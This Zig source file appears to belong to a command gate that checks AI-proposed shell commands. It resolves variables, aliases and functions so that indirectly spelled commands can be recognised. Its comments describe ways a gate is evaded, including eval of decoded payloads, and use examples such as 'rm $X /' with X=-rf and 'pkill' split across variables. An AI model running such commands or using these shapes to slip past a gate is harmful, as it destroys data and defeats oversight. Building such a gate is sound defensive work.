//! Straight-line constant propagation over `shell.zig`'s command model.
//!
//! `shell.zig` deliberately expands nothing: `$P$K` is recorded as *syntax*
//! and reported as a signal, because in general the value of a variable is not
//! knowable at gate time. That is the right default, and it is also more
//! pessimistic than the text usually deserves. In
//!
//!     P=pki; K=ll; $P$K -f myserver
//!
//! nothing is unknown. The assignments and the use are both visible in the
//! same command string, in order, with no branching between them. A gate that
//! reports "the command word is dynamic" here is reporting a limitation of its
//! reader, not a property of the input.
//!
//! This module is that reader. It walks the parse in command order, keeps an
//! environment of the assignments it has passed, and resolves the words that
//! follow. It resolves *only* what the one command string says:
//!
//!   - no execution, no subprocesses, no filesystem, no ambient environment —
//!     a variable this text never assigns is unknown, full stop;
//!   - no branching analysis. `if x; then P=a; else P=b; fi; $P` is two
//!     assignments in text order and the last one wins, which is what a
//!     straight-line reading says and not what the shell will do;
//!   - no fixed point. Every value is resolved at the moment it is bound, from
//!     the bindings already in scope, so `A=$B; B=$A` terminates by
//!     construction rather than by a visited-set.
//!
//! The target is *accidental* evasion — a model reaching for a variable, an
//! alias or a helper function because that is how it would naturally write the
//! line — not a determined adversary. An adversary has `eval` on a decoded
//! payload, and no amount of propagation reads that.
//!
//! What it resolves:
//!
//!   - `VAR=value` assignment-only stages, `export`/`declare`/`local`/
//!     `typeset`/`readonly VAR=value`, and `env VAR=value cmd`;
//!   - assignment *prefixes* (`FOO=bar cmd`), which bind to that invocation
//!     only and must never leak to a later stage (see `lookup` for the exact
//!     visibility rule, and the tests for the shapes it refuses);
//!   - `$VAR`, `${VAR}`, and any concatenation of literals, quoted runs and
//!     expansions — `$P$K`, `${P}ill`, `"$P"kill`, `$P"kill"` — in the command
//!     word *and* in every argument, so `X=-rf; rm $X /` is catchable on the
//!     flag;
//!   - `alias k='cmd -f x'` and `name() { body }`, whose bodies are re-lexed
//!     through `shell.parse` and hung off the invocation as an `Expansion`.
//!
//! Every resolved word keeps the span of the bytes the operator actually
//! wrote. `pkill` recovered from `$P$K` reports `$P$K`'s span, so the decision
//! log and the `check` underline stay truthful about what was read.
//!
//! ### Why a resolved word is not a guess
//!
//! Quote removal is lossy in exactly one way that matters here: `"$P"kill` and
//! `$Pkill` both decode to the bytes `$Pkill`, and only the first is a
//! two-piece word. Reading the decoded text alone would resolve the wrong
//! variable. Two facts `shell.zig` already records make the difference
//! recoverable, and this module leans on both:
//!
//!   - `Word.expansions` counts the expansions the *lexer* saw. If a scan of
//!     the decoded text finds a different number, some `$` in it was quoted or
//!     escaped into a literal, this module cannot tell which, and the word is
//!     left unresolved rather than resolved wrongly (`'$P'$K`);
//!   - `Word.map` is discontinuous exactly where a quote was removed, so a
//!     `$NAME` run is cut at the boundary the quotes used to mark.
//!
//! The rule throughout: resolve only when *every* expansion in the word is
//! known. One unknown piece leaves the whole word unresolved and flagged. A
//! wrong resolution is worse than no resolution — it would make the decision
//! log lie about what the command was going to run.
//!
//! Shapes deliberately not handled, because handling them would mean guessing:
//! parameter expansion with an operator (`${VAR:-x}`, `${#VAR}`, `${VAR/a/b}`),
//! arithmetic, `$@`/`$*`/`$?`, command substitution (reported as
//! `substitution_derived` — the substitution's own text is still lexed by
//! `shell.zig`, so `$(which pkill)` still surfaces `which`), array and
//! associative syntax, `read VAR`, and anything a loop or a conditional would
//! decide.
//!
//! Allocation: one arena per resolution, plus one `shell.Parsed` for each
//! alias or function body that is actually *invoked* — zero of those in the
//! common case. See the "allocation budget" test for the measured numbers.

const std = @import("std");
const shell = @import("shell.zig");

/// Assignment hops allowed behind one value. `A=x; B=$A; C=$B` is a chain of
/// two; a longer one is refused rather than followed, so a pathological
/// definition list cannot turn into quadratic work.
pub const MAX_CHAIN_DEPTH: u8 = 8;

/// Cap on a single resolved value. `A=xx; B=$A$A; C=$B$B; ...` doubles, and
/// doubling is the one way straight-line propagation can blow up.
pub const MAX_VALUE_BYTES: usize = 4096;

/// Cap on live bindings. A command string is a line or two; a hundred and
/// twenty-eight assignments in one is a payload.
pub const MAX_BINDINGS: usize = 128;

/// Cap on alias/function bodies re-lexed per resolution. Each one costs a
/// nested `shell.parse`.
pub const MAX_EXPANSIONS: usize = 16;

pub const Error = error{OutOfMemory};

// ---------------------------------------------------------------------------
// values
// ---------------------------------------------------------------------------

/// Where a word's value came from. The first three mean "this is what will
/// run"; the last two mean "the text does not say, and here is the shape of
/// what it does not say".
pub const Origin = enum {
    /// Written out. No expansion took part.
    literal,
    /// The whole word was one expansion, and it was known: `$CMD`, `${CMD}`.
    resolved_var,
    /// Assembled from more than one piece, all of them known: `$P$K`,
    /// `${P}ill`, `"$P"kill`.
    resolved_concat,
    /// A command word that named an alias. Set on `ResolvedCommand.origin`;
    /// the word itself keeps its own origin.
    alias,
    /// A command word that named a shell function defined in the same text.
    function,
    /// At least one piece was a command substitution or a process
    /// substitution. Not resolvable here — but `shell.zig` has already lexed
    /// the substitution's own text, so the commands inside it are visible.
    substitution_derived,
    /// At least one piece was an expansion this module cannot read: an unknown
    /// variable, a parameter expansion with an operator, arithmetic, `$@`, or
    /// a word whose quoting made the expansion boundaries ambiguous.
    unresolved_dynamic,

    /// The value is knowable from the command text.
    pub fn isResolved(self: Origin) bool {
        return switch (self) {
            .literal, .resolved_var, .resolved_concat => true,
            else => false,
        };
    }

    /// The value is knowable *and* is not simply what was written.
    pub fn isRecovered(self: Origin) bool {
        return self == .resolved_var or self == .resolved_concat;
    }
};

/// One word after resolution. `text` is the value; `span` is where the word
/// was written, which for a recovered word is the `$P$K` occurrence and not
/// the value. Consumers report both: "pkill (resolved from $P$K)".
pub const ResolvedWord = struct {
    /// The resolved value when `origin.isResolved()`, otherwise the parse's
    /// own decoded text with the expansion spellings left in place.
    text: []const u8 = "",
    /// Extent in the ORIGINAL command text. Never rewritten by resolution.
    span: shell.Span = .{},
    origin: Origin = .literal,
    /// Assignment hops behind `text`. 0 for a literal.
    chain: u8 = 0,

    pub fn isResolved(self: ResolvedWord) bool {
        return self.origin.isResolved();
    }

    /// True when reading `text` tells an operator something the raw bytes did
    /// not. This is the condition for "(resolved from ...)" in a message.
    pub fn isRecovered(self: ResolvedWord) bool {
        return self.origin.isRecovered();
    }

    /// The bytes the operator wrote.
    pub fn raw(self: ResolvedWord, source: []const u8) []const u8 {
        return self.span.slice(source);
    }

    pub fn eql(self: ResolvedWord, other: []const u8) bool {
        return std.mem.eql(u8, self.text, other);
    }
};

/// One `NAME=value` binding, with the value already resolved as far as the
/// text allowed.
pub const Binding = struct {
    name: []const u8,
    value: ResolvedWord,
    /// The command that performed the assignment.
    command: u32,
};

// ---------------------------------------------------------------------------
// expansions
// ---------------------------------------------------------------------------

pub const ExpansionKind = enum {
    /// The command word named an `alias` defined earlier in the same text.
    alias,
    /// The command word named a function defined earlier in the same text.
    function,
    /// The command word resolved to a value carrying shell syntax, so the
    /// value is program text rather than a program name: `C="pkill -f x";
    /// eval $C`.
    command_text,
};

/// A body this module re-lexed and hung off the invocation that reached it.
///
/// `parsed.source` is `body`, so every span inside `parsed` indexes `body` —
/// NOT `Resolved.source`. `body_span` says where `body` lives in the original
/// text when it is a direct slice of it (a function definition), and is null
/// when the body came from decoded bytes (an alias value, a variable's value).
pub const Expansion = struct {
    kind: ExpansionKind,
    /// The `shell.Command` index that invoked it.
    command: u32,
    /// Alias or function name; empty for `command_text`.
    name: []const u8 = "",
    body: []const u8,
    /// Where the invocation was written, in the original text.
    span: shell.Span = .{},
    /// Where `body` was written, when that is expressible.
    body_span: ?shell.Span = null,
    parsed: shell.Parsed,
};

// ---------------------------------------------------------------------------
// commands
// ---------------------------------------------------------------------------

/// One `shell.Command` after resolution. `index` is the `shell.Command`
/// index, so the two models line up positionally and a consumer can hold both.
pub const ResolvedCommand = struct {
    index: u32,
    /// The resolved command word, absent for an assignment-only or
    /// redirection-only stage.
    name: ?ResolvedWord = null,
    /// `name.text` reduced to a basename. For an alias or a `command_text`
    /// expansion this is the *body's* first command word, so a rule asking
    /// "what runs here" gets an answer rather than the alias's own name.
    base: []const u8 = "",
    /// Why `base` reads the way it does.
    origin: Origin = .literal,
    /// Parallel to `shell.Command.words`, same length, same order.
    words: []const ResolvedWord = &.{},
    /// This command's own assignment prefix, resolved. Visible to the program
    /// text it runs, never to a later stage.
    locals: []const Binding = &.{},
    /// This stage *defines* a shell function rather than running a command.
    /// Its `base` is the function's name and nothing is executed by it.
    is_definition: bool = false,
    /// Index into `Resolved.expansions` when a body was re-lexed for this
    /// command.
    expansion: ?u32 = null,

    pub fn args(self: ResolvedCommand) []const ResolvedWord {
        if (self.words.len == 0) return &.{};
        return self.words[1..];
    }

    pub fn isNamed(self: ResolvedCommand, want: []const u8) bool {
        return std.mem.eql(u8, self.base, want);
    }

    /// The command word was not written out — it was recovered, or it could
    /// not be.
    pub fn nameWasIndirect(self: ResolvedCommand) bool {
        return self.origin != .literal;
    }
};

// ---------------------------------------------------------------------------
// signals
// ---------------------------------------------------------------------------

/// What resolution learned that `shell.Signals` could not say. Complements it
/// rather than replacing it: a consumer reads both.
pub const Signals = struct {
    /// A command word that is an expansion or a concatenation, which this
    /// module resolved. The command was written indirectly and we can say what
    /// it is.
    resolved_command_word: bool = false,
    /// A command word that is an expansion or a concatenation, which this
    /// module could NOT resolve. That shape is itself worth a shadow rule: the
    /// text does not name what it runs, and nothing in the text can say.
    unresolved_command_word: bool = false,
    /// Some argument resolved to something other than its spelling.
    resolved_argument: bool = false,
    /// An `alias` definition was seen.
    alias_defined: bool = false,
    /// An alias was invoked and its body re-lexed.
    alias_expanded: bool = false,
    /// A function definition was seen.
    function_defined: bool = false,
    /// A function was invoked and its body re-lexed.
    function_expanded: bool = false,
    /// A resolved command word carried shell syntax and was re-lexed as
    /// program text.
    value_is_program_text: bool = false,
    /// `MAX_CHAIN_DEPTH` reached; a value was left unresolved.
    chain_capped: bool = false,
    /// `MAX_VALUE_BYTES` reached; a value was left unresolved.
    value_capped: bool = false,
    /// `MAX_BINDINGS` reached; later assignments were not recorded.
    binding_cap: bool = false,
    /// `MAX_EXPANSIONS` reached; a body was not re-lexed.
    expansion_cap: bool = false,

    pub fn any(self: Signals) bool {
        inline for (@typeInfo(Signals).@"struct".fields) |f| {
            if (f.type == bool and @field(self, f.name)) return true;
        }
        return false;
    }

    /// The subset meaning "the command word was not written out". A rule can
    /// treat either half as its own condition: one says what the text hid, the
    /// other says the text hid something nothing can recover.
    pub fn indirectCommandWord(self: Signals) bool {
        return self.resolved_command_word or self.unresolved_command_word;
    }
};

pub const Stats = struct {
    commands: u32 = 0,
    bindings: u32 = 0,
    aliases: u32 = 0,
    functions: u32 = 0,
    recovered_words: u32 = 0,
    unresolved_words: u32 = 0,
    expansions: u32 = 0,
    arena_bytes: usize = 0,
};

/// The result of one resolution.
///
/// It BORROWS from the `shell.Parsed` it was built from — word texts, spans,
/// and the source itself — so the parse must outlive it. `deinit` frees the
/// arena and every nested parse an `Expansion` holds.
pub const Resolved = struct {
    arena: std.heap.ArenaAllocator,
    source: []const u8,
    /// One entry per `shell.Parsed.commands` entry, same order, same indices.
    commands: []const ResolvedCommand,
    expansions: []Expansion,
    signals: Signals,
    stats: Stats,

    pub fn deinit(self: *Resolved) void {
        for (self.expansions) |*e| e.parsed.deinit();
        self.arena.deinit();
        self.* = undefined;
    }

    pub fn get(self: *const Resolved, index: u32) *const ResolvedCommand {
        return &self.commands[index];
    }

    /// The first command whose RESOLVED basename is `base`, skipping function
    /// definitions (which name a function rather than run one).
    pub fn find(self: *const Resolved, base: []const u8) ?*const ResolvedCommand {
        for (self.commands) |*c| {
            if (c.is_definition) continue;
            if (std.mem.eql(u8, c.base, base)) return c;
        }
        return null;
    }

    pub fn expansionFor(self: *const Resolved, cmd: *const ResolvedCommand) ?*const Expansion {
        const n = cmd.expansion orelse return null;
        return &self.expansions[n];
    }
};

// ---------------------------------------------------------------------------
// resolution
// ---------------------------------------------------------------------------

const Named = struct {
    name: []const u8,
    body: []const u8,
    body_span: ?shell.Span,
};

const Ctx = struct {
    gpa: std.mem.Allocator,
    arena: std.mem.Allocator,
    parsed: *const shell.Parsed,
    out: []ResolvedCommand = &.{},

    env: std.ArrayList(Binding) = .empty,
    aliases: std.ArrayList(Named) = .empty,
    funcs: std.ArrayList(Named) = .empty,
    expansions: std.ArrayList(Expansion) = .empty,

    // Scratch, reused across the whole pass.
    buf: std.ArrayList(u8) = .empty,
    pieces: std.ArrayList(Piece) = .empty,

    signals: Signals = .{},
    stats: Stats = .{},

    fn releaseExpansions(self: *Ctx) void {
        for (self.expansions.items) |*e| e.parsed.deinit();
        self.expansions.clearRetainingCapacity();
    }
};

/// Resolve `parsed` in command order. Never fails on malformed input — every
/// unreadable shape becomes an unresolved word plus a signal.
pub fn resolve(gpa: std.mem.Allocator, parsed: *const shell.Parsed) Error!Resolved {
    var arena_state = std.heap.ArenaAllocator.init(gpa);
    errdefer arena_state.deinit();

    var ctx = Ctx{ .gpa = gpa, .arena = arena_state.allocator(), .parsed = parsed };
    errdefer ctx.releaseExpansions();

    if (parsed.commands.len > 0) {
        ctx.out = try ctx.arena.alloc(ResolvedCommand, parsed.commands.len);

        // One flat array for every word in the parse, sliced per command: a
        // command's word list is never resized, so there is nothing to gain
        // from a per-command allocation.
        var total: usize = 0;
        for (parsed.commands) |c| total += c.words.len;
        const flat = try ctx.arena.alloc(ResolvedWord, total);

        var off: usize = 0;
        for (parsed.commands, 0..) |*c, i| {
            const dst = flat[off .. off + c.words.len];
            off += c.words.len;
            try resolveCommand(&ctx, c, @intCast(i), dst);
        }
    }

    ctx.stats.commands = @intCast(ctx.out.len);
    ctx.stats.expansions = @intCast(ctx.expansions.items.len);
    ctx.stats.arena_bytes = arena_state.queryCapacity();

    const expansions = try ctx.expansions.toOwnedSlice(ctx.arena);

    return .{
        .arena = arena_state,
        .source = parsed.source,
        .commands = ctx.out,
        .expansions = expansions,
        .signals = ctx.signals,
        .stats = ctx.stats,
    };
}

fn resolveCommand(ctx: *Ctx, c: *const shell.Command, idx: u32, dst: []ResolvedWord) Error!void {
    const rc = &ctx.out[idx];
    rc.* = .{ .index = idx, .base = c.base };

    // 1. The assignment prefix. A stage that is *only* assignments performs
    //    them for real, in order, each one visible to the next; a prefix on a
    //    command binds for that invocation alone.
    if (c.assignments.len > 0) {
        const arr = try ctx.arena.alloc(Binding, c.assignments.len);
        const global = c.name == null;
        for (c.assignments, 0..) |a, n| {
            arr[n] = .{
                .name = a.name,
                .value = try resolveWord(ctx, idx, a.word, a.name.len + 1, a.word.text.len),
                .command = idx,
            };
            if (global) try bind(ctx, arr[n]);
        }
        rc.locals = arr;
    } else if (std.mem.eql(u8, c.base, "env")) {
        rc.locals = try envLocals(ctx, c, idx);
    }

    // 2. Every word, command word and arguments alike.
    for (c.words, 0..) |w, n| {
        dst[n] = try resolveWord(ctx, idx, w, 0, w.text.len);
        if (dst[n].isRecovered()) {
            ctx.stats.recovered_words += 1;
            if (n > 0) ctx.signals.resolved_argument = true;
        } else if (!dst[n].isResolved()) {
            ctx.stats.unresolved_words += 1;
        }
    }
    rc.words = dst;

    if (c.words.len > 0) {
        rc.name = dst[0];
        rc.origin = dst[0].origin;
        if (dst[0].isResolved()) rc.base = shell.basenameOf(dst[0].text);

        if (c.name) |n| {
            // `shell.Command.nameIsDynamic` asks the same question of the raw
            // spelling; here we can also answer whether we recovered it.
            if (n.isExpansionOnly() or (n.isConcatenated() and n.has_expansion)) {
                if (dst[0].isResolved()) {
                    ctx.signals.resolved_command_word = true;
                } else {
                    ctx.signals.unresolved_command_word = true;
                }
            }
        }
    }

    // 3. Definitions, which bind a name rather than running anything.
    if (functionDef(ctx, c)) |def| {
        rc.is_definition = true;
        rc.base = def.name;
        ctx.signals.function_defined = true;
        if (ctx.funcs.items.len < MAX_BINDINGS) {
            try ctx.funcs.append(ctx.arena, def);
            ctx.stats.functions += 1;
        }
        return;
    }
    if (std.mem.eql(u8, c.base, "alias") and c.words.len > 1) {
        try readAliases(ctx, c, idx);
        return;
    }

    // 4. Declarators, which bind for every later command.
    if (isDeclarator(c.base)) {
        try readDeclarations(ctx, c, idx);
        return;
    }
    if (std.mem.eql(u8, c.base, "unset")) {
        // An unset name must not keep resolving to its old value; record it as
        // a known-unknown so the shadowed binding stops being found.
        for (c.args()) |w| {
            if (isFlagWord(w.text)) continue;
            try bind(ctx, .{
                .name = w.text,
                .value = .{ .text = "", .span = w.span, .origin = .unresolved_dynamic },
                .command = idx,
            });
        }
        return;
    }

    // 5. A command word that names a body: expand it.
    if (!c.is_process) return;
    const nw = rc.name orelse return;
    if (!nw.isResolved()) return;

    if (nw.isRecovered() and looksLikeProgramText(nw.text)) {
        ctx.signals.value_is_program_text = true;
        try addExpansion(ctx, idx, .command_text, "", nw.text, null, nw.span, true);
        return;
    }
    if (findNamed(ctx.aliases.items, rc.base)) |a| {
        ctx.signals.alias_expanded = true;
        try addExpansion(ctx, idx, .alias, a.name, a.body, a.body_span, nw.span, true);
        rc.origin = .alias;
        return;
    }
    if (findNamed(ctx.funcs.items, rc.base)) |f| {
        ctx.signals.function_expanded = true;
        // A function body is many commands, not one program name: `base` keeps
        // naming the function, and the body is read through the expansion.
        try addExpansion(ctx, idx, .function, f.name, f.body, f.body_span, nw.span, false);
        rc.origin = .function;
        return;
    }
}

// --- the environment --------------------------------------------------------

fn bind(ctx: *Ctx, b: Binding) Error!void {
    if (ctx.env.items.len >= MAX_BINDINGS) {
        ctx.signals.binding_cap = true;
        return;
    }
    try ctx.env.append(ctx.arena, b);
    ctx.stats.bindings += 1;
}

fn findBinding(list: []const Binding, name: []const u8) ?Binding {
    // Backwards: the last assignment before the use is the one in effect.
    var i = list.len;
    while (i > 0) {
        i -= 1;
        if (std.mem.eql(u8, list[i].name, name)) return list[i];
    }
    return null;
}

/// Where an assignment prefix is visible, and where it deliberately is not.
///
/// `FOO=bar cmd` does NOT affect `cmd`'s own words: the shell expands the
/// words first and performs the assignments after, so `FOO=bar echo $FOO`
/// prints the OLD value. The prefix DOES reach the environment of whatever
/// `cmd` runs, so a command reached by re-lexing program text — `bash -c`,
/// `eval` — is expanded by an inner shell that can see it.
///
/// So: the first hop up must both re-expand and carry the environment; every
/// further hop need only carry the environment. A command's own locals are
/// never consulted for its own words.
fn lookup(ctx: *Ctx, idx: u32, name: []const u8) ?Binding {
    const self_prov = ctx.parsed.commands[idx].provenance;
    if (reexpands(self_prov) and passesEnv(self_prov)) {
        var cur: ?u32 = ctx.parsed.commands[idx].parent;
        while (cur) |ci| {
            if (findBinding(ctx.out[ci].locals, name)) |b| return b;
            const sc = &ctx.parsed.commands[ci];
            if (!passesEnv(sc.provenance)) break;
            cur = sc.parent;
        }
    }
    return findBinding(ctx.env.items, name);
}

/// The child's words are expanded by an inner shell rather than by the one
/// that wrote the assignment prefix.
fn reexpands(prov: shell.Provenance) bool {
    return switch (prov) {
        .shell_c, .eval_arg, .remote_shell, .watch_child => true,
        else => false,
    };
}

/// The parent's assignment prefix reaches the child's process environment.
/// False for `sudo` (which scrubs it), `ssh` (which does not forward it), and
/// a container runtime (which starts a fresh one).
fn passesEnv(prov: shell.Provenance) bool {
    return switch (prov) {
        .shell_c, .eval_arg, .env_prefix, .prefix_runner, .timeout_runner, .xargs_child, .builtin_wrapper, .watch_child, .project_runner, .subshell, .command_sub, .backtick, .process_sub => true,
        .top, .privilege, .remote_shell, .container, .subcommand => false,
    };
}

const declarators = [_][]const u8{ "export", "declare", "typeset", "readonly", "local" };

fn isDeclarator(base: []const u8) bool {
    for (declarators) |d| {
        if (std.mem.eql(u8, base, d)) return true;
    }
    return false;
}

fn isFlagWord(t: []const u8) bool {
    return t.len >= 2 and t[0] == '-';
}

fn readDeclarations(ctx: *Ctx, c: *const shell.Command, idx: u32) Error!void {
    for (c.args()) |w| {
        if (isFlagWord(w.text)) continue;
        const eq = std.mem.indexOfScalar(u8, w.text, '=') orelse continue;
        if (!isValidName(w.text[0..eq])) continue;
        try bind(ctx, .{
            .name = w.text[0..eq],
            .value = try resolveWord(ctx, idx, w, eq + 1, w.text.len),
            .command = idx,
        });
    }
}

const env_value_flags = [_][]const u8{ "-u", "--unset", "-C", "--chdir", "-S", "--split-string" };

/// `env FOO=bar cmd` carries its assignments as ordinary argument words rather
/// than in `Command.assignments`; they bind exactly like a prefix.
fn envLocals(ctx: *Ctx, c: *const shell.Command, idx: u32) Error![]const Binding {
    var n: usize = 0;
    var j: usize = 1;
    while (j < c.words.len) : (j += 1) {
        const t = c.words[j].text;
        if (isFlagWord(t)) {
            for (env_value_flags) |f| {
                if (std.mem.eql(u8, t, f)) j += 1;
            }
            continue;
        }
        const eq = std.mem.indexOfScalar(u8, t, '=') orelse break;
        if (!isValidName(t[0..eq])) break;
        n += 1;
    }
    if (n == 0) return &.{};

    const arr = try ctx.arena.alloc(Binding, n);
    var k: usize = 0;
    j = 1;
    while (j < c.words.len and k < n) : (j += 1) {
        const w = c.words[j];
        if (isFlagWord(w.text)) {
            for (env_value_flags) |f| {
                if (std.mem.eql(u8, w.text, f)) j += 1;
            }
            continue;
        }
        const eq = std.mem.indexOfScalar(u8, w.text, '=') orelse break;
        arr[k] = .{
            .name = w.text[0..eq],
            .value = try resolveWord(ctx, idx, w, eq + 1, w.text.len),
            .command = idx,
        };
        k += 1;
    }
    return arr[0..k];
}

// --- aliases and functions --------------------------------------------------

fn findNamed(list: []const Named, name: []const u8) ?Named {
    var i = list.len;
    while (i > 0) {
        i -= 1;
        if (std.mem.eql(u8, list[i].name, name)) return list[i];
    }
    return null;
}

/// `alias k=cmd`, `alias k='cmd -f x'`. The value has already been through
/// quote removal, so an alias body arrives as one word regardless of how it
/// was quoted, and is re-lexed on invocation rather than here.
fn readAliases(ctx: *Ctx, c: *const shell.Command, idx: u32) Error!void {
    for (c.args()) |w| {
        if (isFlagWord(w.text)) continue;
        const eq = std.mem.indexOfScalar(u8, w.text, '=') orelse continue;
        if (eq == 0) continue;
        const value = try resolveWord(ctx, idx, w, eq + 1, w.text.len);
        if (!value.isResolved() or value.text.len == 0) continue;
        if (ctx.aliases.items.len >= MAX_BINDINGS) continue;
        ctx.signals.alias_defined = true;
        try ctx.aliases.append(ctx.arena, .{
            .name = w.text[0..eq],
            .body = value.text,
            .body_span = value.span,
        });
        ctx.stats.aliases += 1;
    }
}

/// `name() { body }` and `function name { body }`.
///
/// `shell.zig` models neither: `foo() { pkill -f x; }` lexes as the words
/// `foo`, `{`, `pkill`, `-f`, `x` — the parentheses become an (empty)
/// subshell, the brace becomes a word, and the body's command word lands in
/// argument position where nothing will look at it. So the shape is recovered
/// here, from the words plus the two bytes between them, and the body is
/// re-lexed when the function is actually invoked.
///
/// Restricted to definitions written at the top level: a body is sliced out of
/// the original source, and the source bytes of a nested region are not the
/// bytes that region lexes.
fn functionDef(ctx: *Ctx, c: *const shell.Command) ?Named {
    if (c.depth != 0 or c.provenance != .top) return null;
    if (c.words.len < 2) return null;
    const src = ctx.parsed.source;

    var name: []const u8 = "";
    var from: usize = 1;

    if (std.mem.eql(u8, c.base, "function")) {
        if (c.words.len < 3) return null;
        const n = c.words[1];
        if (n.has_expansion or !isValidName(n.text)) return null;
        name = n.text;
        from = 2;
    } else {
        const n = c.name orelse return null;
        if (n.quoting.any() or n.has_expansion or !isValidName(n.text)) return null;
        // `()` must follow the name, with nothing but blanks between.
        var i = n.span.end();
        while (i < src.len and (src[i] == ' ' or src[i] == '\t')) i += 1;
        if (i >= src.len or src[i] != '(') return null;
        i += 1;
        while (i < src.len and (src[i] == ' ' or src[i] == '\t')) i += 1;
        if (i >= src.len or src[i] != ')') return null;
        name = n.text;
    }

    // The body opens at the `{` word and closes at its match in the source.
    var brace: ?usize = null;
    for (c.words[from..], from..) |w, k| {
        if (std.mem.eql(u8, w.text, "{")) {
            brace = k;
            break;
        }
    }
    const b = brace orelse return null;
    const start = c.words[b].span.end();
    const close = matchCloseBrace(src, start) orelse return null;
    if (close <= start) return null;

    return .{
        .name = name,
        .body = src[start..close],
        .body_span = .{ .start = start, .len = close - start },
    };
}

/// The `}` matching a `{` whose contents start at `from`, honouring quotes.
fn matchCloseBrace(src: []const u8, from: usize) ?usize {
    var depth: usize = 1;
    var i = from;
    while (i < src.len) : (i += 1) {
        switch (src[i]) {
            '\\' => i += 1,
            '\'' => {
                i += 1;
                while (i < src.len and src[i] != '\'') i += 1;
                if (i >= src.len) return null;
            },
            '"' => {
                i += 1;
                while (i < src.len and src[i] != '"') : (i += 1) {
                    if (src[i] == '\\') i += 1;
                }
                if (i >= src.len) return null;
            },
            '{' => depth += 1,
            '}' => {
                depth -= 1;
                if (depth == 0) return i;
            },
            else => {},
        }
    }
    return null;
}

/// One word carrying shell syntax is program text, not a program name.
fn looksLikeProgramText(t: []const u8) bool {
    return std.mem.indexOfAny(u8, t, " \t\n|&;<>()$`") != null;
}

fn addExpansion(
    ctx: *Ctx,
    idx: u32,
    kind: ExpansionKind,
    name: []const u8,
    body: []const u8,
    body_span: ?shell.Span,
    span: shell.Span,
    adopt_base: bool,
) Error!void {
    if (body.len == 0) return;
    if (ctx.expansions.items.len >= MAX_EXPANSIONS) {
        ctx.signals.expansion_cap = true;
        return;
    }

    var p = try shell.parse(ctx.gpa, body);
    errdefer p.deinit();

    try ctx.expansions.append(ctx.arena, .{
        .kind = kind,
        .command = idx,
        .name = name,
        .body = body,
        .span = span,
        .body_span = body_span,
        .parsed = p,
    });
    ctx.out[idx].expansion = @intCast(ctx.expansions.items.len - 1);
    if (adopt_base and p.commands.len > 0) ctx.out[idx].base = p.commands[0].base;
}

// --- word resolution --------------------------------------------------------

const Piece = struct {
    /// Offset into the word's decoded text.
    off: usize,
    len: usize,
    kind: Kind,
    /// Variable name, for `.name` and `.braced`.
    name: []const u8 = "",

    const Kind = enum { name, braced, special, arith, command_sub, backtick, process_sub };
};

/// Resolve `w.text[lo..hi]`. `lo` is non-zero only for an assignment's value
/// half, whose name half never contains an expansion — so the count check
/// below stays exact either way.
fn resolveWord(ctx: *Ctx, idx: u32, w: shell.Word, lo: usize, hi: usize) Error!ResolvedWord {
    const span = if (lo == 0 and hi == w.text.len) w.span else w.originSpan(lo, hi - lo);

    // Quoting already answered this: a `$` that survived quote removal without
    // being counted as an expansion is a literal dollar.
    if (!w.has_expansion) {
        return .{ .text = w.text[lo..hi], .span = span, .origin = .literal };
    }

    ctx.pieces.clearRetainingCapacity();
    try scanExpansions(ctx, w, lo, hi);
    const pieces = ctx.pieces.items;

    // The lexer counted the expansions it saw. A different count means some
    // `$` in the decoded text is a literal that quoting produced, we cannot
    // tell which, and resolving would be a guess: `'$P'$K`.
    if (pieces.len != w.expansions) {
        return .{ .text = w.text[lo..hi], .span = span, .origin = .unresolved_dynamic };
    }

    ctx.buf.clearRetainingCapacity();
    var chain: u8 = 0;
    var literal_bytes: usize = 0;
    var saw_substitution = false;
    var ok = true;
    var cursor = lo;

    for (pieces) |p| {
        try ctx.buf.appendSlice(ctx.arena, w.text[cursor..p.off]);
        literal_bytes += p.off - cursor;
        cursor = p.off + p.len;

        switch (p.kind) {
            .name, .braced => {
                if (!isValidName(p.name)) {
                    ok = false;
                    continue;
                }
                const b = lookup(ctx, idx, p.name) orelse {
                    ok = false;
                    continue;
                };
                if (!b.value.isResolved()) {
                    ok = false;
                    continue;
                }
                if (b.value.chain >= MAX_CHAIN_DEPTH) {
                    ctx.signals.chain_capped = true;
                    ok = false;
                    continue;
                }
                chain = @max(chain, b.value.chain + 1);
                try ctx.buf.appendSlice(ctx.arena, b.value.text);
            },
            .command_sub, .backtick, .process_sub => {
                saw_substitution = true;
                ok = false;
            },
            .arith, .special => ok = false,
        }

        if (ctx.buf.items.len > MAX_VALUE_BYTES) {
            ctx.signals.value_capped = true;
            ok = false;
            break;
        }
    }

    if (!ok) {
        return .{
            .text = w.text[lo..hi],
            .span = span,
            .origin = if (saw_substitution) .substitution_derived else .unresolved_dynamic,
        };
    }

    try ctx.buf.appendSlice(ctx.arena, w.text[cursor..hi]);
    literal_bytes += hi - cursor;

    return .{
        .text = try ctx.arena.dupe(u8, ctx.buf.items),
        .span = span,
        .origin = if (pieces.len == 1 and literal_bytes == 0) .resolved_var else .resolved_concat,
        .chain = chain,
    };
}

/// The decoded offset at which `off`'s contiguous run of original bytes ends.
///
/// This is what distinguishes `"$P"kill` from `$Pkill`: both decode to the
/// bytes `$Pkill`, but the first has a map discontinuity where the quote was
/// removed, and a variable name may not cross it.
fn segEnd(w: shell.Word, off: usize) usize {
    if (w.map.len == 0) return w.text.len;
    for (w.map) |s| {
        if (off >= s.dec and off < s.dec + s.len) return s.dec + s.len;
    }
    return w.text.len;
}

/// Every expansion spelling in `w.text[lo..hi]`, in order.
///
/// Must recognize exactly the constructs `shell.zig` counts in
/// `Word.expansions`; the count check in `resolveWord` is only sound because
/// this recognizes no fewer of them.
fn scanExpansions(ctx: *Ctx, w: shell.Word, lo: usize, hi: usize) Error!void {
    const t = w.text;
    var i = lo;
    while (i < hi) {
        const c = t[i];

        if (c == '`') {
            var j = i + 1;
            while (j < hi and t[j] != '`') : (j += 1) {
                if (t[j] == '\\') j += 1;
            }
            const end = if (j < hi) j + 1 else hi;
            try ctx.pieces.append(ctx.arena, .{ .off = i, .len = end - i, .kind = .backtick });
            i = end;
            continue;
        }
        if ((c == '<' or c == '>') and i + 1 < hi and t[i + 1] == '(') {
            const close = matchParen(t, i + 2, hi);
            const end = if (close < hi) close + 1 else hi;
            try ctx.pieces.append(ctx.arena, .{ .off = i, .len = end - i, .kind = .process_sub });
            i = end;
            continue;
        }
        if (c != '$') {
            i += 1;
            continue;
        }

        const n: u8 = if (i + 1 < hi) t[i + 1] else 0;
        if (n == '(') {
            if (i + 2 < hi and t[i + 2] == '(') {
